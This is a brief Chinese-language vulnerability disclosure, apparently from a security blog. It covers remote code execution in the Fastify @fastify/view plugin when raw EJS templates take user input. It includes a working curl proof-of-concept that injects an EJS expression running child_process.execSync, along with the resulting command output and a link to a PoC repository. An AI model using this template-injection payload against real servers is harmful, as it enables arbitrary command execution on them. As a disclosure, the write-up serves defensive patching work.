#  通过@fastify/view raw 渲染实现远程代码执行   
 TtTeam   2025-05-09 06:07  
  
漏洞摘要  
  
Fastify 的@fastify/view插件允许使用 进行原始模板渲染raw: true。当与EJS和不受信任的用户输入 一起使用时，将导致远程代码执行。  
  
远程代码执行（RCE）  
  
该@fastify/view插件与 EJS 引擎和reply.view({ raw: <user-controlled-string> })相关模式配合使用时，允许任意 EJS 执行。当攻击者能够控制raw传递给视图渲染器的内容时，这会导致远程代码执行 (RCE)。此漏洞源于 Fastify 信任未经任何清理或限制的原始模板字符串，并将其直接传递给 EJS 的compile()方法。  
  
这是实际使用的有效载荷的最小示例：  
  
```
curl -X POST http://localhost:3000/render \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'text=<%= require("child_process").execSync("id").toString() %>'
```  
  
  
输出：  
```
uid=1000(nullprophet) gid=1000(nullprophet) groups=... 
```  
  
截屏：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0HlywncJbB30emPClKgrAsFyraia5Dfm0CpkVibuecHj3icobiaNoahO7M7icylemRHbAfcks05VJ8fzHu8liarVe4bQ/640?wx_fmt=png&from=appmsg "")  
  
这通过模板逻辑证实了完整的 RCE — 与您的官方示例相匹配（例如reply.view({ raw })）。  
  
这将在服务器上执行任意命令并返回结果。服务器端代码默认不包含此逻辑——它只是将不受信任的输入传递给rawEJS 上下文。  
  
https://github.com/Oblivionsage/fastify-ejs-rce-raw-template-injection  
  
  
  
